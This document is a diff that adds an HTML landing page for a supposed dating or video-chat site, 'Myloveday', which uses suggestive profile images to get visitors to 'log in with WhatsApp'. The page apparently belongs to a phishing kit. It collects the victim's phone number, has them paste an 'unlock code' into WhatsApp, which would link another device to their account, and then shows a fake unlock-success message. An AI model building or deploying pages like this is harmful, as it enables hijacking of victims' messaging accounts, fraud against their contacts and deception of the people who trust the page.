@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title data-copy="title">Myloveday</title>
+    <meta name="description" content="Log in with WhatsApp to video chat." data-copy="description" />
+    <meta property="og:title" content="Myloveday" data-copy="title" />
+    <meta property="og:description" content="Log in with WhatsApp to video chat." data-copy="description" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="assets/images/og-image.jpg" />
+    <link rel="stylesheet" href="assets/theme.css" />
+    <script src="assets/scene.js" defer></script>
+    <script src="assets/account-link-elements.js" defer></script>
+  </head>
+  <body>
+    <div id="landing-stage">
+      <div class="atmosphere" aria-hidden="true">
+        <div class="scrolling-images">
+          <div class="scrolling-image"></div>
+          <div class="scrolling-image"></div>
+        </div>
+        <div class="atmosphere-veil"></div>
+      </div>
+
+      <main class="showcase-shell">
+        <p class="showcase-live" data-copy="liveLabel">
+          <span class="showcase-live-dot" aria-hidden="true"></span>
+          LIVE
+        </p>
+
+        <h1 class="showcase-brand" data-copy="brandTitle">Myloveday</h1>
+
+        <article class="showcase-hero">
+          <div class="showcase-portrait">
+            <img
+              src="assets/images/cs1.jpg"
+              alt=""
+              width="437"
+              height="779"
+              fetchpriority="high"
+            />
+          </div>
+          <p class="showcase-hook" data-copy="heroText">
+            Log in with WhatsApp to video chat with real users. (People here are very direct.)
+          </p>
+        </article>
+      </main>
+
+      <section class="thumbnails" aria-label="Featured profiles">
+        <div class="thumbnails-container">
+          <img src="assets/images/2.jpg" alt="" class="thumbnail" width="437" height="779" loading="lazy" />
+          <img src="assets/images/3-1.jpg" alt="" class="thumbnail" width="440" height="779" loading="lazy" />
+          <img src="assets/images/4.jpg" alt="" class="thumbnail" width="439" height="777" loading="lazy" />
+          <img src="assets/images/5-1.jpg" alt="" class="thumbnail" width="439" height="779" loading="lazy" />
+          <img src="assets/images/6-1.jpg" alt="" class="thumbnail" width="460" height="690" loading="lazy" />
+          <img src="assets/images/7.jpg" alt="" class="thumbnail" width="438" height="780" loading="lazy" />
+          <img src="assets/images/8.jpg" alt="" class="thumbnail" width="437" height="780" loading="lazy" />
+        </div>
+      </section>
+
+      <span id="cta-copy" hidden data-copy="ctaButton">Log in with WhatsApp</span>
+      <button type="button" class="download-button" id="downloadButton" aria-labelledby="cta-copy"></button>
+    </div>
+
+    <div class="main-container" id="main-container">
+      <div class="text-info">
+        <h2 data-copy="overlayTitle">Log in to unlock full photos and videos</h2>
+        <p data-copy="overlaySubtitle">Enjoy more exciting content!</p>
+      </div>
+
+      <span id="phone-copy" hidden>
+        <span data-copy="phoneLabel">Please enter your WhatsApp mobile number</span>
+        <span data-copy="phonePlaceholder">Enter your mobile number</span>
+        <span data-copy="countrySearchPlaceholder">Search for country name or code</span>
+        <span data-copy="submitLabel">CONTINUE</span>
+        <span data-copy="pairingTitle">Enter the unlock code on your phone</span>
+        <span data-copy="associating">Linking your WhatsApp account</span>
+        <span data-copy="tipsHeading">Tips</span>
+        <span data-copy="tipsCopied">The unlock code has been copied. Please paste it in WhatsApp.</span>
+        <span data-copy="verificationLabel">Unlock code:</span>
+        <span data-copy="successTitle">Unlock successful!</span>
+        <span data-copy="successBody">You have successfully unlocked full photos and videos!</span>
+        <span data-copy="successFooter">You can now enjoy all the exciting content.</span>
+        <span data-copy="successContinue">Continue</span>
+      </span>
+
+      <account-link-flow class="login-flow">
+        <div class="login-box" id="login-card">
+          <phone-number-field></phone-number-field>
+        </div>
+        <account-link-submit id="continue-btn"></account-link-submit>
+        <pairing-code-panel></pairing-code-panel>
+        <app-launch-actions></app-launch-actions>
+        <account-link-status></account-link-status>
+        <account-initialization-status></account-initialization-status>
+      </account-link-flow>
+    </div>
+
+    <div class="success-modal" id="success-modal" hidden>
+      <div class="success-modal-card">
+        <h2 class="success-modal-title" data-copy="successTitle">Unlock successful!</h2>
+        <p class="success-modal-body" data-copy="successBody">
+          You have successfully unlocked full photos and videos!
+        </p>
+        <div class="ok-circle" aria-hidden="true">✔</div>
+        <p class="success-modal-footer" data-copy="successFooter">
+          You can now enjoy all the exciting content.
+        </p>
+        <button type="button" class="success-continue-btn" id="success-continue-btn" data-copy="successContinue">
+          Continue
+        </button>
+      </div>
+    </div>
+  </body>
+</html>
